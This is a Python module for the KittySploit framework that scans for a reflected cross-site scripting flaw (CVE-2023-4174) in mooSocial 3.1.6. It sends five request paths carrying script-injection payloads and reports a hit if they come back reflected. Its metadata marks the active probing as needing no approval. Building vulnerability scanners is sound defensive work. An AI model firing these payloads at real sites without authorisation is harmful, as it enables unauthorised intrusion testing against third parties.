#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""A vulnerability has been found in mooSocial mooStore 3."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'mooSocial 3.1.6 - Reflected Cross Site Scripting Detection',
        'description': 'A vulnerability has been found in mooSocial mooStore 3.1.6 and classified as problematic. Affected by this vulnerability is an unknown functionality. The manipulation leads to cross site scripting. The attack can be launched remotely.',
        'author': ['KittySploit Team'],
        'severity': 'medium',
        'tags': ['web', 'scanner', 'cve', 'cve2023', 'packetstorm', 'moosocial', 'xss', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 5,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'admin_surface',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': ['auxiliary/scanner/http/login_page_detector'],
            },
        },
        'references': [
            'https://www.exploit-db.com/exploits/51671',
            'https://nvd.nist.gov/vuln/detail/CVE-2023-4174',
            'https://packetstormsecurity.com/files/174017/Social-Commerce-3.1.6-Cross-Site-Scripting.html',
            'https://vuldb.com/?ctiid.236209',
            'https://vuldb.com/?id.236209',
        ],
        'cve': 'CVE-2023-4174',
    }

    def run(self):
        for path in ('/search/index?q="><img+src=a+onerror=alert(document.domain)>ridxm', '/stores"><img+src=a+onerror=alert(document.domain)>ridxm/all-products?store_id=&keyword=&price_from=&price_to=&rating=&store_category_id=&sortby=most_recent', '/user_info"><img+src=a+onerror=alert(document.domain)>ridxm/index/friends', '/faqs"><img+src=a+onerror=alert(document.domain)>ridxm/index?content_search="><img+src=a+onerror=alert(document.domain)>ridxm', '/classifieds"><img+src=a+onerror=alert(document.domain)>ridxm/search?category=1'):
            r = self.http_request(method="GET", path=path, allow_redirects=False)
            if not r or r.status_code != 200:
                continue
            body = r.text or ""
            headers = "\n".join(f"{k}: {v}" for k, v in r.headers.items())
            body_all = ('<img src=a onerror=alert(document.domain)>ridxm', 'mooSocial',)
            header_any = ('text/html',)
            if (all(m in body for m in body_all)) and (any(m in headers for m in header_any)):
                self.set_info(
                    severity='medium',
                    reason="mooSocial 3.1.6 - Reflected Cross Site Scripting detected",
                    path=path,
                )
                return True
        return False

